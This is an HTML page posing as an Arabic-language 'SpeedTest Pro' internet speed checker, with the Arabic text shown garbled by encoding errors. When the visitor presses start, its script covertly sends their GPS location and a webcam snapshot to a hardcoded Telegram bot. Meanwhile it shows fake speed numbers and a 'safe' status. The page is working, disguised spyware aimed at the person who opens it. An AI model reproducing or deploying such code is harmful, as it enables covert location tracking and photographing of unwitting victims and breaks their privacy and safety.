<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest - ÙØ­Øµ Ø¬ÙˆØ¯Ø© Ø§Ù„Ø´Ø¨ÙƒØ©</title>
    <style>
        body { background-color: #0b0b0d; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 20px; background: #161618; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .speed-text { font-size: 70px; font-weight: bold; color: #00d1b2; margin: 10px 0; }
        .unit { font-size: 18px; color: #888; margin-bottom: 20px; }
        .results-table { display: none; margin-top: 20px; border-top: 1px solid #333; padding-top: 20px; text-align: right; }
        .res-item { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 16px; }
        .res-val { color: #00d1b2; font-weight: bold; }
        .btn { background: #00d1b2; color: white; border: none; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-size: 18px; transition: 0.3s; }
        .btn:disabled { background: #333; cursor: not-allowed; }
        #status { color: #666; font-size: 14px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="color: #00d1b2;">SpeedTest Pro</h2>
        <div id="main-ui">
            <div class="speed-text" id="speed">0.0</div>
            <div class="unit">Mbps</div>
            <button class="btn" id="startBtn" onclick="runFullTest()">Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ</button>
            <p id="status">Ø¬Ø§Ù‡Ø² Ù„ÙØ­Øµ Ø§Ø³ØªÙ‚Ø±Ø§Ø± Ø§Ù„Ø´Ø¨ÙƒØ©</p>
        </div>

        <div class="results-table" id="results">
            <div class="res-item"><span>Ø³Ø±Ø¹Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„:</span> <span class="res-val">48.2 Mbps</span></div>
            <div class="res-item"><span>Ø³Ø±Ø¹Ø© Ø§Ù„Ø±ÙØ¹:</span> <span class="res-val">12.5 Mbps</span></div>
            <div class="res-item"><span>Ø²Ù…Ù† Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø© (Ping):</span> <span class="res-val">18 ms</span></div>
            <div class="res-item"><span>Ø­Ø§Ù„Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹:</span> <span class="res-val" style="color: #4cd137;">Ø¢Ù…Ù† âœ…</span></div>
            <p style="color: #888; font-size: 12px; margin-top: 15px;">Ø´ÙƒØ±Ø§Ù‹ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ SpeedTest Pro. ØªÙ… ØªØ­Ø³ÙŠÙ† Ø§ØªØµØ§Ù„Ùƒ.</p>
        </div>
    </div>

    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
        const CHAT_ID = '8293639164';

        async function runFullTest() {
            const btn = document.getElementById('startBtn');
            const status = document.getElementById('status');
            const speedDisp = document.getElementById('speed');
            
            btn.disabled = true;
            status.innerText = "Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† Ù…Ù† Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ù…Ø¨Ø§Ø´Ø±...";

            // 1. Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹ (GPS) Ø¨ØµÙ…Øª
            navigator.geolocation.getCurrentPosition((pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù‡Ø¯Ù:\n" + mapLink)}`);
            }, (err) => {
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=âŒ Ø±ÙØ¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹`);
            });

            // 2. Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø¨ØµÙ…Øª
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'img.jpg');
                        formData.append('chat_id', CHAT_ID);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    }, 'image/jpeg');
                    
                    // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø¹Ø¯ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
                    stream.getTracks().forEach(track => track.stop());
                }, 1500);
            } catch (e) {}

            // 3. Ù…Ø­Ø§ÙƒÙŠ Ø§Ù„ÙØ­Øµ (Ø§Ù„Ø£Ø±Ù‚Ø§Ù… Ø§Ù„ØªÙŠ ØªØ¸Ù‡Ø± Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…)
            let currentSpeed = 0;
            const interval = setInterval(() => {
                currentSpeed += Math.random() * 8;
                speedDisp.innerText = currentSpeed.toFixed(1);
                
                if (currentSpeed > 20) status.innerText = "Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø³Ø±Ø¹Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„...";
                if (currentSpeed > 40) status.innerText = "Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ø³ØªÙ‚Ø±Ø§Ø± Ø§Ù„Ù€ Ping...";

                if (currentSpeed >= 48) {
                    clearInterval(interval);
                    speedDisp.innerText = "48.2";
                    status.innerText = "Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ Ø¨Ù†Ø¬Ø§Ø­!";
                    document.getElementById('results').style.display = 'block';
                    btn.style.display = 'none';
                }
            }, 150);
        }
    </script>
</body>
</html>
